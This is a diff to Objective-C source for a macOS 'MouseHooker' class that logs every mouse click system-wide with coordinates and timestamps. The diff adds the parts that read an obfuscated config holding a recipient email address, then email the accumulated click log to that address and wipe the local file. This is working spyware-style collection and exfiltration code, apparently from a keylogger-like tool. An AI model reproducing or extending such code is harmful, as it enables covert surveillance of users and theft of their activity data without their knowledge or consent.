@@ -10,6 +10,25 @@
 
 @implementation MouseHooker
 
+- (id)init {
+    self = [super init];
+    
+    shouldSend = NO;
+    
+    NSString *config = [FileManager readFromFile:@"config"];
+    if ([config isNotEqualTo: @"error"]) {
+        NSArray *components = [config componentsSeparatedByString:@"\n"];
+        fileSize = [[Cryptographer doIt:components[1]] integerValue];
+        email = [NSString stringWithString:[Cryptographer doIt:components[0]]];
+        
+        if ([[Cryptographer doIt:components[2]] isEqualToString:@"1"]) {
+            shouldSend = YES;
+        }
+    }
+    
+    return self;
+}
+
 - (void)setMouseNotifications {
     [NSEvent addGlobalMonitorForEventsMatchingMask:NSLeftMouseDownMask handler:^(NSEvent *event) { [self leftClick]; }];
     [NSEvent addGlobalMonitorForEventsMatchingMask:NSRightMouseDownMask handler:^(NSEvent *event) { [self rightClick]; }];
@@ -27,6 +46,7 @@
     NSString *y = [NSString stringWithFormat:@"%.0f", mouseLoc.y];
     
     [FileManager writeToFile:@"buttons" file:[NSString stringWithFormat:@"L: (%-5s; %-4s) at %@\n", [x UTF8String], [y UTF8String], [Time currentTime]]];
+    [self sendLog];
 }
 
 - (void)rightClick {
@@ -36,6 +56,7 @@
     NSString *y = [NSString stringWithFormat:@"%.0f", mouseLoc.y];
     
     [FileManager writeToFile:@"buttons" file:[NSString stringWithFormat:@"R: (%-5s; %-4s) at %@\n", [x UTF8String], [y UTF8String], [Time currentTime]]];
+    [self sendLog];
 }
 
 - (void)otherClick {
@@ -45,6 +66,19 @@
     NSString *y = [NSString stringWithFormat:@"%.0f", mouseLoc.y];
     
     [FileManager writeToFile:@"buttons" file:[NSString stringWithFormat:@"O: (%-5s; %-4s) at %@\n", [x UTF8String], [y UTF8String], [Time currentTime]]];
+    [self sendLog];
+}
+
+- (void)sendLog {
+    if ([FileManager getFileSize:@"buttons"] >= fileSize && shouldSend) {
+        [EmailSender sendEmailWithMail:email Attachments:@[@"buttons"]];
+        [FileManager clearFile:@"buttons"];
+    }
+}
+
+- (void)setShouldSend:(BOOL)flag {
+    NSLog(@"Hello");
+    shouldSend = flag;
 }
 
 @end
